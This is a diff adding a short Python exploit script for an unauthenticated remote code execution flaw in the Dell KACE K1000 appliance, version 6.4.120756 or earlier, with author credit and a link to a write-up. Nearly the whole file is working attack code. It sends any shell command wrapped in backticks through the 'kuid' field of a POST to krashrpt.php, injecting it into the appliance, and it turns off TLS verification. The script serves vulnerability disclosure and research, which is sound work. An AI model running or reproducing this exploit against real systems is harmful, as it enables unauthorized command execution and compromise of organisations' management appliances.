@@ -1,0 +1,24 @@
+#!/usr/bin/python
+# Exploit Title: Dell KACE Systems Management Appliance (K1000) <= 6.4.120756 Unauthenticated RCE
+# Version:       <= 6.4.120756
+# Date:          2019-04-09
+# Author:        Julien Ahrens (@MrTuxracer)
+# Software Link: https://www.quest.com/products/kace-systems-management-appliance/
+# Write-up:      https://www.rcesecurity.com/2019/04/dell-kace-k1000-remote-code-execution-the-story-of-bug-k1-18652/
+# Note:          The software is maintained by Quest now, but the vulnerability was fixed while Quest was part of Dell.            
+#
+# Usage: python3 exploit.py https://localhost 'sleep 10'
+
+import requests
+import sys
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+target_url = sys.argv[1]
+payload = sys.argv[2]
+
+r = requests.post(target_url + '/service/krashrpt.php', data={
+    'kuid' : '`' + payload + '`'
+    }, verify=False)
+
+print('Response: %s %s\nKACE Version: %s\nResponse time: %ss' % (r.status_code, r.reason, r.headers['X-DellKACE-Version'], r.elapsed.total_seconds()))
